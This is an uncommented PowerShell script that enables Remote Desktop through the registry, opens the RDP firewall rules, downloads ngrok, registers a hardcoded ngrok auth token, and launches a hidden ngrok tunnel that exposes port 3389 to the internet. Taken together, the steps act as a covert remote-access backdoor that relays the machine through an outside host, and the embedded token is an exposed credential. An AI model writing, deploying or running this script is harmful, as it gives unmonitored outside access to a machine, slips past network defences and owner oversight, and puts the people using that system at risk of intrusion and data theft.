$ngrokToken = "2xe3OPcwxui4icUAn8vBgxysHzH_6ceP3DS71bZm5mRxktwua"
$ngrokPath = "$env:APPDATA\ngrok"
$ngrokExe = "$ngrokPath\ngrok.exe"
$zipPath = "$env:TEMP\ngrok.zip"

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -Force
Enable-NetFirewallRule -DisplayGroup "Remote Desktop" | Out-Null

if (-Not (Test-Path $ngrokExe)) {
    Invoke-WebRequest -Uri "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -OutFile $zipPath
    Expand-Archive -Path $zipPath -DestinationPath $ngrokPath -Force
}

if (-Not (Test-Path "$env:USERPROFILE\.ngrok2\ngrok.yml")) {
    & $ngrokExe config add-authtoken $ngrokToken
}

Start-Process -FilePath $ngrokExe -ArgumentList "tcp 3389" -WindowStyle Hidden